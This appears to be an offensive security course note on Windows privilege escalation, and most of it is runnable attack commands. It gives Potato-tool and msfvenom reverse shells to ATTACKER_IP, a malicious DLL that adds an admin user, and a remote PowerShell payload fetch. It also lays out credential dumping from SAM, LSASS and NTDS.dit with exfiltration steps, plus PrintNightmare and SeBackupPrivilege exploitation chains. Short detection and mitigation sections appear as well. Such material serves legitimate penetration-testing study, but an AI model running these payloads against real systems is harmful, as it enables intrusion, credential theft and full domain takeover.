# 06.2 — Windows Privilege Escalation

## The Goal

You have a shell as a low-privilege Windows user. The target is NT AUTHORITY\SYSTEM or local Administrator — the two highest-privilege contexts on a Windows machine.

The methodology mirrors Linux: enumerate everything, find the weakest misconfiguration, exploit it.

## Token Impersonation (SeImpersonatePrivilege)

### What It Is

Windows uses access tokens to represent security context. Certain service accounts (IIS, SQL Server, network services) have `SeImpersonatePrivilege` — the right to impersonate another user's token.

If you land a shell as one of these service accounts, you can impersonate SYSTEM via token theft.

```cmd
:: Check your privileges
whoami /priv

:: Look for:
:: SeImpersonatePrivilege   Impersonate a client after authentication   Enabled
:: SeAssignPrimaryTokenPrivilege   (also exploitable)
```

### JuicyPotato / RoguePotato / PrintSpoofer / GodPotato

These tools exploit token impersonation to escalate from service account → SYSTEM. Which one works depends on the Windows version.

```cmd
:: PrintSpoofer — works on Windows 10, Server 2016/2019
PrintSpoofer.exe -i -c cmd.exe
PrintSpoofer.exe -c "nc.exe ATTACKER_IP 4444 -e cmd.exe"

:: GodPotato — Windows Server 2012 to 2022, Windows 8 to 11
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "cmd /c nc.exe ATTACKER_IP 4444 -e cmd.exe"

:: JuicyPotato — older systems (Server 2008-2016, Win 7-10)
:: Requires a valid CLSID for the target OS
JuicyPotato.exe -l 1337 -p cmd.exe -a "/c nc.exe ATTACKER_IP 4444 -e cmd.exe" -t * -c {CLSID}
:: CLSID lists: https://github.com/ohpe/juicy-potato/tree/master/CLSID

:: RoguePotato — Server 2019+
RoguePotato.exe -r ATTACKER_IP -e "cmd.exe" -l 9999
```

> [!tip]
> If you have a Meterpreter shell, use the `getsystem` command first — it tries multiple token impersonation techniques automatically. If that fails, manually upload and run PrintSpoofer or GodPotato.

## Unquoted Service Paths

### What It Is

When a Windows service's binary path contains spaces and is **not quoted**, Windows tries to resolve it by attempting multiple path interpretations.

```
Path: C:\Program Files\My Application\service.exe

Windows tries in order:
1. C:\Program.exe
2. C:\Program Files\My.exe
3. C:\Program Files\My Application\service.exe
```

If you can write to `C:\Program Files\My.exe` (or any earlier path component), Windows runs your file as SYSTEM when the service starts.

### Finding Unquoted Service Paths

```cmd
:: Find services with unquoted paths containing spaces
wmic service get name,pathname | findstr /v """  | findstr " "

:: PowerShell
Get-WmiObject win32_service | Where-Object {$_.PathName -notmatch '"' -and $_.PathName -match ' '} | Select-Object Name, PathName, StartMode

:: Or check specific service
sc qc "Service Name"
:: Look for BINARY_PATH_NAME containing spaces without quotes
```

### Exploiting Unquoted Service Path

```cmd
:: Example: BINARY_PATH_NAME = C:\Program Files\Vulnerable Service\service.exe

:: Check write permissions on each directory component
icacls "C:\Program Files\"
icacls "C:\Program Files\Vulnerable Service\"

:: If you can write to C:\Program Files\:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o Vulnerable.exe
:: Upload to C:\Program Files\Vulnerable.exe

:: Set up listener: nc -lvnp 4444

:: Restart the service (requires restart rights or wait for reboot)
sc stop "Vulnerable Service"
sc start "Vulnerable Service"
:: Service starts → Windows finds C:\Program Files\Vulnerable.exe → executes as SYSTEM
```

## DLL Hijacking

### What It Is

Windows applications load DLLs (Dynamic Link Libraries) in a specific search order. If a DLL is missing and the application searches a directory you can write to before finding the real DLL, you can plant a malicious DLL.

Windows DLL search order (simplified):
1. Application directory
2. System directory (`C:\Windows\System32`)
3. Windows directory (`C:\Windows`)
4. Current directory
5. Directories in PATH

If a privileged application searches for a DLL in a user-writable location → DLL hijacking.

### Finding DLL Hijack Opportunities

```cmd
:: Use Process Monitor (ProcMon) from Sysinternals on Windows
:: Filter: Path contains .dll AND Result = NAME NOT FOUND
:: → Lists all missing DLLs that apps are trying to load

:: Or Robber tool (automated DLL hijacking finder)
Robber.exe /result:output.txt

:: Check if the application directory is writable
icacls "C:\Program Files\VulnerableApp\"
```

### Creating a Malicious DLL

```bash
# msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 \
  -f dll -o missing_dll.dll

# Compile a custom DLL (C)
# Create missing_dll.c:
# #include <windows.h>
# BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
#     if (fdwReason == DLL_PROCESS_ATTACH) {
#         system("cmd.exe /c net localgroup administrators attacker /add");
#     }
#     return TRUE;
# }
# Compile: x86_64-w64-mingw32-gcc missing_dll.c -shared -o missing_dll.dll
```

## AlwaysInstallElevated

If both of these registry keys are set to 1, any user can install `.msi` packages with SYSTEM privileges.

```cmd
:: Check both registry keys
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: Both must return 0x1 to be exploitable
```

### Exploit

```bash
# Generate malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 \
  -f msi -o malicious.msi
```

```cmd
:: Install the MSI (runs as SYSTEM)
msiexec /quiet /qn /i malicious.msi
:: → SYSTEM reverse shell
```

## SAM / SYSTEM / SECURITY — Local Hash Dumping In Depth

When you reach Administrator/SYSTEM on a Windows host, dumping the local credential stores is one of the fastest pivots: the hashes go straight into pass-the-hash, password sprays, or offline cracking, and they reveal the local admin password (which is reused across machines depressingly often).

The local credential material lives in three registry hives:

| Hive | Contents | Why you want it |
|---|---|---|
| `HKLM\SAM` | Local user database — RIDs, NTLM hashes (LM if pre-Vista) | Local Administrator hash, all local accounts |
| `HKLM\SYSTEM` | Encryption keys (`bootkey`/`syskey`) needed to decrypt SAM and SECURITY | Required for both other extractions |
| `HKLM\SECURITY` | LSA secrets — cached domain credentials, service account passwords (often plaintext for older services), `$MACHINE.ACC` (computer account password) | Domain creds even on workgroup-detached boxes |

### Method 1 — `reg save` (Standard Path)

The cleanest method on a live system. Requires `SeBackupPrivilege` (admin/SYSTEM has it).

```cmd
:: From an elevated cmd.exe on the target
reg save HKLM\SAM       C:\Windows\Temp\sam.save
reg save HKLM\SYSTEM    C:\Windows\Temp\system.save
reg save HKLM\SECURITY  C:\Windows\Temp\security.save

:: Exfil the three files (SMB, HTTP, scp via WSL — anything that works)
:: From your attack box:
smbclient '\\target\C$' -U Administrator%pass -c 'cd Windows\Temp; get sam.save; get system.save; get security.save'

:: Clean up on target
del C:\Windows\Temp\sam.save C:\Windows\Temp\system.save C:\Windows\Temp\security.save
```

```bash
# On attacker — extract with Impacket
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL

# Sample output
# [*] Target system bootKey: 0x...
# [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
# Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# [*] Dumping cached domain logon information (domain/username:hash)
# DOMAIN/jdoe:$DCC2$10240#jdoe#0123456789abcdef...
# [*] Dumping LSA Secrets
# [*] $MACHINE.ACC
# DOMAIN\HOSTNAME$:plain_password_here:::
# [*] DPAPI_SYSTEM
# dpapi_machinekey:0x...
# dpapi_userkey:0x...
```

### Method 2 — Volume Shadow Copy (When `reg save` Is Blocked)

If `reg save` is being blocked by EDR / lacks privilege / Defender is interfering, falling through Volume Shadow Copy Service is the durable fallback.

```cmd
:: Create a snapshot of C:
vssadmin create shadow /for=C:
:: Output gives a "Shadow Copy Volume Name", e.g.:
:: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1

:: Copy SAM and SYSTEM out of the snapshot (which is a frozen, unlocked view of the live disk)
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM      C:\Windows\Temp\sam.copy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM   C:\Windows\Temp\system.copy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\Windows\Temp\security.copy

:: Snapshot can also be used to copy NTDS.dit (for DC):
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Windows\Temp\ntds.dit

:: Clean up the snapshot when done
vssadmin delete shadows /for=C: /quiet
```

PowerShell-only equivalent (when `cmd.exe` is restricted):

```powershell
$wmi = (Get-WmiObject -List Win32_ShadowCopy).Create('C:\','ClientAccessible')
$shadow = Get-WmiObject Win32_ShadowCopy | ? { $_.ID -eq $wmi.ShadowID }
$shadowVol = $shadow.DeviceObject + '\'
Copy-Item ($shadowVol + 'Windows\System32\config\SAM')      C:\Windows\Temp\sam.copy
Copy-Item ($shadowVol + 'Windows\System32\config\SYSTEM')   C:\Windows\Temp\system.copy
Copy-Item ($shadowVol + 'Windows\System32\config\SECURITY') C:\Windows\Temp\security.copy
$shadow.Delete()
```

### Method 3 — Mimikatz In-Memory (Fast But Loud)

If you've got SYSTEM and AMSI/EDR isn't slamming Mimikatz, this gets you everything in one shot — local SAM, LSASS plaintexts, Kerberos tickets, DPAPI keys.

```powershell
:: First get debug privilege (needed to read LSASS)
privilege::debug
:: token::elevate           # if running as admin but not SYSTEM yet

:: Local SAM
lsadump::sam

:: Cached domain creds (DCC2 hashes — slow to crack)
lsadump::cache

:: LSA secrets (service account passwords, often plaintext)
lsadump::secrets

:: LSASS — pulls plaintext passwords (Win 8.1 and earlier with WDigest), NTLM, Kerberos tickets
sekurlsa::logonpasswords
sekurlsa::tickets /export    # extract Kerberos tickets to .kirbi files

:: DCSync (run from a host with the appropriate rights)
lsadump::dcsync /domain:CORP.LOCAL /user:krbtgt
```

**WDigest plaintext caveat:** Pre-2014 Windows cached the user's plaintext password in LSASS via WDigest for SSO. Post-Win 8.1 / Server 2012 R2 with KB2871997 + `UseLogonCredential = 0`, plaintext is no longer cached. You can flip it back on as admin and wait for someone to log in (`reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1`) but that's noisy and requires patience. Modern boxes give you NTLM hashes from LSASS, not plaintext.

### Method 4 — Process Dump LSASS (EDR-Aware)

When Mimikatz fails (signatures, AMSI), dump LSASS to a file and parse offline.

```cmd
:: Built-in: Task Manager → right-click lsass.exe → Create dump file
:: Or from cmd:
tasklist /FI "imagename eq lsass.exe"           # find the PID

:: Use comsvcs.dll (signed Microsoft binary — bypasses many EDR rules)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\Windows\Temp\lsass.dmp full

:: Or PowerShell + reflective Out-Minidump
Out-Minidump -Process (Get-Process lsass)

:: Or dump via SYSTEM-only procdump (Sysinternals — sometimes flagged but signed)
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```bash
# On attacker — pypykatz parses the dump (Mimikatz-equivalent in pure Python)
pypykatz lsa minidump lsass.dmp
# Outputs same data: NTLM hashes, Kerberos tickets, plaintext when present
```

### NTDS.dit — Domain Controller's Hash Dump

NTDS.dit is the Active Directory database. It contains every domain account's NTLM hash. With it, you own the domain — Pass-the-Hash as any user, forge Golden Tickets with the krbtgt hash.

```cmd
:: On the DC (need SYSTEM there)
:: NTDS.dit is locked while AD DS is running — use VSS:

ntdsutil "ac in ntds" "ifm" "create full C:\Windows\Temp\ntdsdump" q q
:: Creates: C:\Windows\Temp\ntdsdump\Active Directory\ntds.dit
:: Plus:    C:\Windows\Temp\ntdsdump\registry\SYSTEM and SECURITY

:: Or use vssadmin manually as shown earlier and grab:
::  \Windows\NTDS\ntds.dit
::  \Windows\System32\config\SYSTEM
```

```bash
# On attacker
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
# Output is the entire domain — every user, krbtgt, computer account.

# Or extract over the network via DCSync (if your account has GetChanges + GetChangesAll):
impacket-secretsdump 'CORP/Administrator:Pass123!@DC01.corp.local' -just-dc-ntlm
impacket-secretsdump -k -no-pass DC01.corp.local           # using a Kerberos ticket
```

### Detection / Why This Trips Alarms

| Action | EventID / signal |
|---|---|
| `reg save` of SAM/SYSTEM | EventID 4663 (object access) on SAM hive, parent process is reg.exe |
| `vssadmin create shadow` | EventID 4688 (process creation) for vssadmin.exe (rare in normal usage) — easy detection rule |
| Mimikatz running | AMSI block, EDR signature on `mimikatz.exe`, suspicious `OpenProcess(LSASS, PROCESS_VM_READ)` — most EDRs alert on this |
| `comsvcs.dll MiniDump` | EventID 4688 with rundll32 + MiniDump argument — very high-fidelity detection rule |
| LSASS read access | Microsoft Defender for Endpoint explicitly alerts on cross-process LSASS read |
| NTDS extraction | EventID 4662 (replication) when DCSync is used — high-fidelity if from a non-DC source |

**LSA Protection (RunAsPPL)** — adding `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL = 1` makes LSASS a Protected Process Light; only signed Microsoft processes can read it. This breaks Mimikatz `sekurlsa::logonpasswords`. Bypasses exist (driver-loading like Mimikatz's `mimidrv.sys`, BYOVD techniques) but they all trip EDRs.

**Credential Guard** (Windows 10+, Enterprise/Education) — runs LSASS secrets in a hardware-isolated VBS container. Even SYSTEM on the host kernel can't read them. When you see Credential Guard enabled, the LSASS dump path no longer yields plaintext or NTLM hashes — only Kerberos service tickets remain useful. `sekurlsa::logonpasswords` will return empty hashes.

## PowerUp — One-Stop Privesc Enumeration

[PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) is the Windows analogue of LinPEAS — a single PowerShell script that runs every standard local privesc check.

```powershell
# Bypass execution policy and import
powershell -ep bypass
. .\PowerUp.ps1

# Run all checks
Invoke-AllChecks

# Or run individual checks
Get-ServiceUnquoted              # unquoted service paths
Get-ModifiableServiceFile        # services with writable binaries
Get-ModifiableService            # services where ACL allows config change
Find-PathDLLHijack               # DLL hijack opportunities in PATH
Get-RegistryAlwaysInstallElevated
Get-UnattendedInstallFile
Get-WebConfig                    # IIS web.config files with creds
Get-ApplicationHost              # IIS app pool creds
```

`Invoke-AllChecks` prints a summary at the end with the abuse function for each finding (`Invoke-ServiceAbuse -Name 'VulnSvc' -Command 'net user attacker P@ss /add'`). Read each finding with the abuse-fn name and execute when you've verified.

For a more modern equivalent: **[winPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)** is the WinPEAS counterpart with the same colour-coded output as LinPEAS — recommended over PowerUp for thoroughness. Drop `winPEASany.exe` and run.

## PrintNightmare (CVE-2021-34527 and CVE-2021-1675)

### What It Is

PrintNightmare is a critical Windows Print Spooler vulnerability that allows both local and remote privilege escalation. Two related CVEs affect the same service:

- CVE-2021-1675 — local privilege escalation via the Print Spooler service
- CVE-2021-34527 — remote code execution + local privesc via the same service

Both allow a low-privilege domain user to execute code as SYSTEM by abusing the AddPrinterDriver functionality. The Print Spooler service runs as SYSTEM and loads printer drivers supplied by authenticated users — it does not verify driver signatures when loaded via certain RPC calls.

### Affected Systems

Virtually all Windows versions released before Microsoft's July 2021 patch, including:
- Windows 7 through Windows 10
- Windows Server 2008 through Server 2019

Check for the patch:

    wmic qfe get HotFixID | findstr KB5004945
    wmic qfe get HotFixID | findstr KB5004946
    wmic qfe get HotFixID | findstr KB5004947

If none of the July 2021 KBs are present on an older system, it is likely vulnerable.

Also check if the Print Spooler service is running:

    sc query spooler
    Get-Service -Name Spooler

If the service is running and the patch is absent, proceed.

### Local Privilege Escalation (From a Low-Privilege Local Shell)

Using the PowerShell PoC by calebstewart:

    # Load in memory (no disk write)
    Import-Module .\CVE-2021-1675.ps1

    # Or load directly from your attacker HTTP server
    IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/CVE-2021-1675.ps1')

    # Add a new local administrator account
    Invoke-Nightmare -NewUser "hacker" -NewPassword "Hacker@123" -DriverName "PrintMe"

    # Verify
    net localgroup administrators

    # Now connect as the new local admin
    # evil-winrm -i TARGET -u hacker -p 'Hacker@123'

Using the Python/Impacket PoC (cube0x0's version) from Linux:

    # Install
    git clone https://github.com/cube0x0/CVE-2021-1675
    pip3 install impacket

    # Generate a malicious DLL payload
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 \
      -f dll -o evil.dll

    # Host the DLL on an SMB share
    sudo impacket-smbserver share /tmp/share -smb2support

    # Set up listener
    nc -lvnp 4444

    # Trigger the exploit (as any authenticated domain user)
    python3 CVE-2021-1675.py corp.local/jsmith:Password123@192.168.1.10 \
      '\\ATTACKER_IP\share\evil.dll'

### Remote Code Execution (CVE-2021-34527)

The remote variant allows any authenticated domain user to trigger RCE on a remote Windows host that has the Spooler service running and exposed.

    # Same Python PoC — works remotely
    python3 CVE-2021-1675.py corp.local/jsmith:Password123@192.168.1.50 \
      '\\ATTACKER_IP\share\evil.dll'

    # The DLL executes as SYSTEM on the remote host (192.168.1.50)

### Checking if RPC PrintSpooler is Remotely Accessible

    # From Kali
    rpcdump.py corp.local/jsmith:Password123@192.168.1.50 | grep -i spoolss
    # If MS-RPRN (spoolss) appears in the output, the remote attack is viable

### Mitigation (For Reports)

The primary fix is to apply Microsoft's July 2021 cumulative update (KB5004945 or equivalent for the OS version). If patching is not immediately possible:

    # Disable the Print Spooler service on systems that do not need printing
    Stop-Service -Name Spooler -Force
    Set-Service -Name Spooler -StartupType Disabled

    # If printing is required, restrict remote access to the spooler
    # Group Policy: Computer Configuration -> Administrative Templates ->
    # Printers -> "Allow Print Spooler to accept client connections" -> Disabled
    # (Disables remote printing but keeps local printing functional)

## SeBackupPrivilege — Reading Any File as Non-Admin

### What It Is

SeBackupPrivilege is a Windows privilege that grants the ability to read any file on the system regardless of the file's DACL (discretionary access control list). It was designed to allow backup software to read all files without needing to take ownership. When held by a low-privilege user, it allows reading files that are otherwise restricted — including the SAM hive and NTDS.dit.

The privilege is typically assigned to:
- Members of the Backup Operators group
- Service accounts used by backup software
- Occasionally misconfigured accounts in enterprise environments

### Detecting SeBackupPrivilege

    whoami /priv
    # Look for:
    # SeBackupPrivilege    Back up files and directories    Enabled

    # Or via PowerShell
    [System.Security.Principal.WindowsPrincipal][System.Security.Principal.WindowsIdentity]::GetCurrent()

If you have a shell as a member of the Backup Operators group but SeBackupPrivilege shows as Disabled, you need to enable it:

    # Enable privileges in current process using PowerShell
    # (PowerShell does not automatically enable all assigned privileges)
    
    # Option 1: Use a new cmd.exe process (privileges auto-enabled in cmd)
    # If evil-winrm: just use cmd commands, not PowerShell
    
    # Option 2: Use PsExec to get a proper session with full privileges
    PsExec64.exe -i cmd.exe
    whoami /priv    # SeBackupPrivilege should now show Enabled

### Exploiting SeBackupPrivilege — Dump SAM and SYSTEM (Local Machine)

SeBackupPrivilege allows using robocopy or the Win32 backup API to read protected files. The standard path is to dump SAM + SYSTEM from a live system:

    # Method 1: reg save (works via cmd when SeBackupPrivilege is active)
    reg save HKLM\SAM C:\Windows\Temp\sam.hive
    reg save HKLM\SYSTEM C:\Windows\Temp\sys.hive
    reg save HKLM\SECURITY C:\Windows\Temp\sec.hive

    # Transfer to Kali and extract hashes
    # (via SMB share, evil-winrm download, or scp)
    impacket-secretsdump -sam sam.hive -system sys.hive -security sec.hive LOCAL

    # Method 2: If reg save is blocked, use diskshadow + robocopy
    # Create a diskshadow script
    echo "set context persistent nowriters" > C:\Windows\Temp\shadow.txt
    echo "add volume c: alias temp_shadow" >> C:\Windows\Temp\shadow.txt
    echo "create" >> C:\Windows\Temp\shadow.txt
    echo "expose %temp_shadow% z:" >> C:\Windows\Temp\shadow.txt

    diskshadow /s C:\Windows\Temp\shadow.txt
    # Creates a shadow copy of C: mounted as Z:

    # Now robocopy can read SAM from the shadow copy (bypasses live-file lock)
    robocopy /b Z:\Windows\System32\Config C:\Windows\Temp SAM SYSTEM SECURITY
    # /b = backup mode — uses SeBackupPrivilege

    # Transfer and extract
    impacket-secretsdump -sam C:\Windows\Temp\SAM -system C:\Windows\Temp\SYSTEM LOCAL

### Exploiting SeBackupPrivilege — Dump NTDS.dit (Domain Controller)

If you have SeBackupPrivilege on a Domain Controller (e.g., via Backup Operators membership), you can extract NTDS.dit — the AD database containing all domain password hashes.

    # Step 1: Create a shadow copy of the C: drive on the DC
    # Using diskshadow (interactive mode):
    diskshadow
    > set context persistent nowriters
    > set metadata C:\Windows\Temp\meta.cab
    > set verbose on
    > begin backup
    > add volume C: alias cdrive
    > create
    > expose %cdrive% Z:
    > end backup
    > exit

    # Step 2: Copy NTDS.dit from the shadow copy using robocopy /b
    robocopy /b Z:\Windows\NTDS C:\Windows\Temp ntds.dit
    robocopy /b Z:\Windows\System32\Config C:\Windows\Temp SYSTEM

    # Step 3: Transfer both files to Kali

    # Step 4: Extract all domain hashes
    impacket-secretsdump -ntds C:\Windows\Temp\ntds.dit \
      -system C:\Windows\Temp\SYSTEM LOCAL

    # Output: every domain account's NTLM hash
    # Use krbtgt hash for Golden Ticket (see 04.4)
    # Use administrator hash for Pass-the-Hash

### SeBackupPrivilege — Local Privesc via Writable Services

If running as a Backup Operator on a standalone (non-DC) machine, an alternative path is to use the write counterpart (SeRestorePrivilege, often granted alongside SeBackupPrivilege) to overwrite a service binary:

    whoami /priv
    # Look for BOTH:
    # SeBackupPrivilege     Enabled
    # SeRestorePrivilege    Enabled

    # With SeRestorePrivilege: overwrite a service binary that runs as SYSTEM
    # (Use the DLL hijack / service binary replacement methodology from the main note above)
    # robocopy /b can copy files INTO protected locations when SeRestorePrivilege is active

### Backup Operators Group — Lateral Movement to DC

Membership in the Backup Operators group grants SeBackupPrivilege and also the right to log on locally to Domain Controllers (even for non-admin accounts). This is a direct DA path in many environments:

    # Check if current user is in Backup Operators
    net user %username% /domain | findstr "Backup"
    Get-ADGroupMember "Backup Operators" | Where-Object {$_.SamAccountName -eq $env:USERNAME}

    # If yes: can RDP or PSExec to DC with low-privilege credentials
    # Then dump NTDS.dit as described above
    evil-winrm -i DC01 -u backupuser -p 'Password123'
    # Once on DC: run the diskshadow + robocopy + secretsdump chain
